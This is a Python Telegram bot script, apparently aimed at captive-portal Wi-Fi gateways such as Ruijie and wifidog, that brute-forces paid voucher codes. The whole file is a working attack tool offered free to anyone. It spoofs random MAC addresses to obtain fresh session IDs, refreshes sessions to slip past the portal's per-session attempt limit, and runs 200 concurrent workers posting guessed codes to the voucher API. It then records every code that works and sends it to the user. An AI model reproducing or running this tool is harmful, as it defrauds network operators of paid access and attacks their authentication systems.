#!/usr/bin/env python3
import os
import re
import sys
import time
import string
import random
import asyncio
import aiohttp
import json
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin, urlencode, urlunparse

from telebot.async_telebot import AsyncTeleBot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton

# ---------------------- CONFIGURATION ----------------------
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # <-- သင့် Bot Token ထည့်ပါ
DATA_FILE = "bot_data.json"

# Scanner Limits
PER_USER_CONCURRENCY = 200 
PER_SESSION_MAX = 90      # Ruijie session က 9 ခါပဲရတော့ 8 ခါမှာ refresh
TIMEOUT_SEC = 10

# ---------------------- DATA PERSISTENCE (Simplified) ----------------------
class DataManager:
    def __init__(self, file_path):
        self.file_path = file_path
        self.data = {
            "users": {}  # user_id: { "urls": [], "tried_codes": [], "success_codes": [], "settings": {...} }
        }
        self.load()

    def load(self):
        if os.path.exists(self.file_path):
            try:
                with open(self.file_path, 'r') as f:
                    loaded_data = json.load(f)
                    for key in self.data:
                        if key in loaded_data:
                            self.data[key] = loaded_data[key]
            except Exception as e:
                print(f"Error loading data: {e}")
        self.save()

    def save(self):
        try:
            with open(self.file_path, 'w') as f:
                json.dump(self.data, f, indent=4)
        except Exception as e:
            print(f"Error saving data: {e}")

    def get_user_data(self, user_id):
        uid = str(user_id)
        if uid not in self.data["users"]:
            self.data["users"][uid] = {
                "urls": [], 
                "tried_codes": [], 
                "success_codes": [], 
                "settings": {"char_set": "0123456789", "code_len": 6}
            }
        else:
            if "urls" not in self.data["users"][uid]:
                self.data["users"][uid]["urls"] = []
            if "tried_codes" not in self.data["users"][uid]:
                self.data["users"][uid]["tried_codes"] = []
            if "success_codes" not in self.data["users"][uid]:
                self.data["users"][uid]["success_codes"] = []
            if "settings" not in self.data["users"][uid]:
                self.data["users"][uid]["settings"] = {"char_set": "0123456789", "code_len": 6}
        return self.data["users"][uid]

    def update_user_tried(self, user_id, code):
        uid = str(user_id)
        if uid in self.data["users"]:
            if code not in self.data["users"][uid]["tried_codes"]:
                self.data["users"][uid]["tried_codes"].append(code)
                if len(self.data["users"][uid]["tried_codes"]) > 10000:
                    self.data["users"][uid]["tried_codes"] = self.data["users"][uid]["tried_codes"][-10000:]
                self.save()

    def add_success_code(self, user_id, code):
        uid = str(user_id)
        self.get_user_data(user_id)
        if code not in self.data["users"][uid]["success_codes"]:
            self.data["users"][uid]["success_codes"].append(code)
            self.save()

    def clear_success_codes(self, user_id):
        uid = str(user_id)
        if uid in self.data["users"] and "success_codes" in self.data["users"][uid]:
            self.data["users"][uid]["success_codes"] = []
            self.save()

    def clear_user_urls(self, user_id):
        uid = str(user_id)
        if uid in self.data["users"]:
            self.data["users"][uid]["urls"] = []
            self.save()

    def update_user_settings(self, user_id, setting_key, setting_value):
        uid = str(user_id)
        if uid in self.data["users"] and "settings" in self.data["users"][uid]:
            self.data["users"][uid]["settings"][setting_key] = setting_value
            self.save()

    def add_user_url(self, user_id, url):
        uid = str(user_id)
        self.get_user_data(user_id)
        if url not in self.data["users"][uid]["urls"]:
            self.data["users"][uid]["urls"].append(url)
            self.save()
            return True
        return False

data_manager = DataManager(DATA_FILE)

# ---------------------- USER SESSION MANAGER ----------------------
class UserSession:
    def __init__(self, user_id):
        self.user_id = user_id
        self.stop_event = asyncio.Event()
        self.scan_task = None
        self.stats = {
            "total_tried": 0,
            "total_hits": 0,
            "current_code": "----",
            "start_time": 0
        }
        self.status_msg_id = None
        self.current_url_index = 0
        self.state = None 
        
    def reset_stats(self):
        self.stats = {
            "total_tried": 0,
            "total_hits": 0,
            "current_code": "----",
            "start_time": time.time()
        }
        self.stop_event.clear()

user_sessions = {}

def get_session(user_id) -> UserSession:
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession(user_id)
    return user_sessions[user_id]

# ---------------------- SCANNING ENGINE ----------------------
bot = AsyncTeleBot(BOT_TOKEN)

def generate_random_mac():
    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))

async def get_sid_from_gateway(session, portal_url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    try:
        u = urlparse(portal_url)
        query = parse_qs(u.query)
        query['mac'] = [generate_random_mac()]
        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))
        
        async with session.get(spoofed_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r2:
            body = await r2.text()
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if match:
                final_url = urljoin(spoofed_url, match.group(1))
                async with session.get(final_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r3:
                    final_url = str(r3.url)
            else:
                final_url = str(r2.url)
            
            parsed_query = parse_qs(urlparse(final_url).query)
            sid = parsed_query.get('sessionId', parsed_query.get('sid', [None]))[0]
            return sid
    except Exception as e:
        print(f"Error getting SID from gateway {portal_url}: {e}")
        return None

async def worker_task(user_id, app_session):
    session = get_session(user_id)
    u_data = data_manager.get_user_data(user_id)
    urls = u_data["urls"]
    if not urls: 
        return

    char_set = u_data["settings"]["char_set"]
    code_len = u_data["settings"]["code_len"]
    tried_codes = set(u_data["tried_codes"])
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'
    }
    
    my_sid = None
    use_count = 0
    
    while not session.stop_event.is_set():
        current_url = urls[session.current_url_index % len(urls)]
        base_url = f"{urlparse(current_url).scheme}://{urlparse(current_url).netloc}"

        # Session ID ကို 8 ခါသုံးပြီးတိုင်း အသစ်ယူ (Ruijie က 9 ခါပဲရတယ်)
        if my_sid is None or use_count >= PER_SESSION_MAX:
            my_sid = await get_sid_from_gateway(app_session, current_url)
            if not my_sid:
                session.current_url_index += 1
                await asyncio.sleep(0.1)
                continue
            use_count = 0

        code = ''.join(random.choices(char_set, k=code_len))
        if code in tried_codes: 
            continue
        tried_codes.add(code)
        data_manager.update_user_tried(user_id, code)
        
        session.stats["current_code"] = code
        try:
            api_url = f"{base_url}/api/auth/voucher/"
            payload = {'accessCode': code, 'sessionId': my_sid, 'apiVersion': 1}
            
            async with app_session.post(api_url, json=payload, headers=headers, timeout=5, ssl=False) as r:
                session.stats["total_tried"] += 1
                use_count += 1
                res_text = (await r.text()).lower()
                
                if '"success":true' in res_text or 'logonurl' in res_text:
                    session.stats["total_hits"] += 1
                    data_manager.add_success_code(user_id, code)
                    await bot.send_message(user_id, f"✅ <b>FOUND SUCCESS CODE:</b> <code>{code}</code>", parse_mode="HTML")
                
                # Request limit မိရင် session refresh
                if "request limited" in res_text or "expired" in res_text:
                    my_sid = None
        except Exception as e:
            my_sid = None
            await asyncio.sleep(0.1)

async def dashboard_updater(user_id):
    session = get_session(user_id)
    while not session.stop_event.is_set():
        if session.status_msg_id:
            elapsed = time.time() - session.stats["start_time"]
            speed = session.stats["total_tried"] / elapsed if elapsed > 0 else 0
            current_time_str = datetime.now().strftime("%I:%M:%S %p")
            
            text = (
                f"🔥 <b>FREE VOUCHER SCANNER</b> 🔥\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⏰ <b>CLOCK:</b> <code>{current_time_str}</code>\n"
                f"🚀 <b>SPEED:</b> {speed:.1f} c/s\n"
                f"🏹 <b>TRIED:</b> {session.stats['total_tried']:,}\n"
                f"🎯 <b>FOUND:</b> {session.stats['total_hits']}\n"
                f"🔑 <b>CURRENT:</b> <code>{session.stats['current_code']}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"ℹ️ <i>Free for everyone | No limits</i>"
            )
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton(text="🛑 STOP SCANNER", callback_data="stop_scan"))
            try:
                await bot.edit_message_text(chat_id=user_id, message_id=session.status_msg_id, text=text, reply_markup=markup, parse_mode="HTML")
            except Exception:
                session.status_msg_id = None
        await asyncio.sleep(3)

async def main_scanner_task(user_id):
    connector = aiohttp.TCPConnector(limit=PER_USER_CONCURRENCY, limit_per_host=0, ttl_dns_cache=300, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as app_session:
        tasks = [asyncio.create_task(dashboard_updater(user_id))]
        tasks.extend([asyncio.create_task(worker_task(user_id, app_session)) for _ in range(PER_USER_CONCURRENCY)])
        await asyncio.gather(*tasks)

# ---------------------- BOT KEYBOARD MENUS ----------------------

def get_user_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("🔗 ADD PORTAL URL"), KeyboardButton("📄 MY URLS"))
    markup.add(KeyboardButton("⚙️ SETUP CONFIG"), KeyboardButton("🚀 START SCAN"))
    markup.add(KeyboardButton("📄 MY SUCCESS CODES"))
    markup.add(KeyboardButton("🛑 STOP SCAN"))
    return markup

@bot.message_handler(commands=['start'])
async def cmd_start(message):
    user_id = message.from_user.id
    session = get_session(user_id)
    session.state = None
    
    await bot.reply_to(
        message,
        f"👋 <b>Welcome to FREE Voucher Scanner!</b>\n\n"
        f"👤 <b>Your ID:</b> <code>{user_id}</code>\n\n"
        f"✨ <b>This is COMPLETELY FREE</b>\n"
        f"🔓 No limits, no expiry, no payment required!\n\n"
        f"📌 Add your Portal URL and start scanning.",
        reply_markup=get_user_keyboard(),
        parse_mode="HTML"
    )

# ---------------------- MESSAGE HANDLER ----------------------
@bot.message_handler(content_types=['text'])
async def handle_messages(message):
    user_id = message.from_user.id
    session = get_session(user_id)
    text_data = message.text.strip()

    # --- USER INPUT PORTAL URL ---
    if session.state == "waiting_for_url":
        if not (text_data.startswith("http://") or text_data.startswith("https://")):
            await bot.reply_to(message, "❌ Invalid URL. Must start with http:// or https://")
        elif data_manager.add_user_url(user_id, text_data):
            await bot.reply_to(message, "✅ URL added successfully!", reply_markup=get_user_keyboard())
        else:
            await bot.reply_to(message, "⚠️ This URL is already in your list.", reply_markup=get_user_keyboard())
        session.state = None
        return

    # --- STANDARD KEYBOARD NAVIGATION ---
    if text_data == "🔗 ADD PORTAL URL":
        session.state = "waiting_for_url"
        await bot.reply_to(message, "📎 Please send the Portal URL you want to add.\n\nExample: http://192.168.0.1:2060/wifidog/auth?gw_id=...")
        
    elif text_data == "📄 MY URLS":
        u_data = data_manager.get_user_data(user_id)
        urls = u_data["urls"]
        if not urls:
            text = "❌ You haven't added any URLs yet."
            markup = None
        else:
            text = "<b>📋 Your URLs:</b>\n\n" + "\n".join([f"{i+1}. {u[:80]}..." for i, u in enumerate(urls)])
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton(text="🗑 CLEAR ALL URLS", callback_data="clear_urls"))
        await bot.reply_to(message, text, reply_markup=markup, parse_mode="HTML")

    elif text_data == "📄 MY SUCCESS CODES":
        u_data = data_manager.get_user_data(user_id)
        success_list = u_data.get("success_codes", [])
        if not success_list:
            text = "⚠️ <b>No success codes found yet.</b>"
            markup = None
        else:
            text = "🎯 <b>Your Success Codes:</b>\n\n"
            for i, code in enumerate(success_list):
                text += f"{i+1}. <code>{code}</code>\n"
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton(text="🗑 CLEAR ALL", callback_data="clear_success_codes"))
        await bot.reply_to(message, text, reply_markup=markup, parse_mode="HTML")
        
    elif text_data == "⚙️ SETUP CONFIG":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton(text="🔢 Numbers (0-9)", callback_data="set_m_num"),
            InlineKeyboardButton(text="🔤 Letters (a-z)", callback_data="set_m_alpha"),
            InlineKeyboardButton(text="🔀 Mixed (0-9 a-z)", callback_data="set_m_mixed")
        )
        await bot.reply_to(message, "⚙️ <b>Select Character Set:</b>", reply_markup=markup, parse_mode="HTML")
        
    elif text_data == "🚀 START SCAN":
        u_data = data_manager.get_user_data(user_id)
        if not u_data["urls"]:
            await bot.reply_to(message, "⚠️ Please add at least one URL first!")
            return

        if session.scan_task and not session.scan_task.done():
            await bot.reply_to(message, "⚠️ Scanner is already running.\nUse 🛑 STOP SCAN to stop first.")
            return
        
        session.reset_stats()
        status_msg = await bot.reply_to(message, "🚀 <b>Initializing Scanner...</b>", parse_mode="HTML")
        session.status_msg_id = status_msg.message_id
        session.scan_task = asyncio.create_task(main_scanner_task(user_id))
        
    elif text_data == "🛑 STOP SCAN":
        if session.scan_task and not session.scan_task.done():
            session.stop_event.set()
            session.scan_task.cancel()
            try:
                await session.scan_task
            except asyncio.CancelledError:
                pass
            session.scan_task = None
            await bot.reply_to(message, "🛑 <b>Scanner stopped successfully!</b>", parse_mode="HTML")
        else:
            await bot.reply_to(message, "⚠️ No scanner is currently running.")

# ---------------------- INLINE CALLBACK HANDLERS ----------------------
@bot.callback_query_handler(func=lambda call: call.data == "clear_success_codes")
async def inline_clear_success_codes(call):
    user_id = call.from_user.id
    data_manager.clear_success_codes(user_id)
    await bot.answer_callback_query(call.id, "All success codes cleared!", show_alert=True)
    await bot.edit_message_text("🗑 <b>Success codes have been cleared.</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == "clear_urls")
async def inline_clear_urls(call):
    user_id = call.from_user.id
    data_manager.clear_user_urls(user_id)
    await bot.answer_callback_query(call.id, "All URLs cleared!")
    await bot.edit_message_text("🗑 <b>All URLs have been deleted.</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == "stop_scan")
async def inline_stop_scan(call):
    user_id = call.from_user.id
    session = get_session(user_id)
    if session.scan_task and not session.scan_task.done():
        session.stop_event.set()
        session.scan_task.cancel()
        try:
            await session.scan_task
        except asyncio.CancelledError:
            pass
        session.scan_task = None
    await bot.answer_callback_query(call.id, "🛑 Scanner stopped.")
    await bot.edit_message_text("🛑 <b>Scanner has been stopped.</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == "set_m_num")
async def cb_set_m_num(call):
    user_id = call.from_user.id
    data_manager.update_user_settings(user_id, "char_set", "0123456789")
    await prompt_length_selection(call)

@bot.callback_query_handler(func=lambda call: call.data == "set_m_alpha")
async def cb_set_m_alpha(call):
    user_id = call.from_user.id
    data_manager.update_user_settings(user_id, "char_set", string.ascii_lowercase)
    await prompt_length_selection(call)

@bot.callback_query_handler(func=lambda call: call.data == "set_m_mixed")
async def cb_set_m_mixed(call):
    user_id = call.from_user.id
    data_manager.update_user_settings(user_id, "char_set", "0123456789" + string.ascii_lowercase)
    await prompt_length_selection(call)

async def prompt_length_selection(call):
    markup = InlineKeyboardMarkup(row_width=3)
    buttons = [InlineKeyboardButton(text=f"{i} digits", callback_data=f"set_l_{i}") for i in [4,5,6,7,8]]
    markup.add(*buttons)
    await bot.edit_message_text("📏 <b>Select Code Length:</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith("set_l_"))
async def cb_set_len(call):
    user_id = call.from_user.id
    length = int(call.data.split("_")[-1])
    data_manager.update_user_settings(user_id, "code_len", length)
    await bot.answer_callback_query(call.id, f"Code length set to {length}")
    await bot.edit_message_text(f"✅ <b>Settings saved!</b>\n\nCode length: {length}\n\nReady to scan.", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")

# ---------------------- STARTING THE BOT ----------------------
async def main():
    print("[*] Starting FREE Voucher Scanner Bot...")
    print("[!] No authorization required - Free for everyone!")
    await bot.polling(non_stop=True)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Bot stopped.")
        sys.exit(0)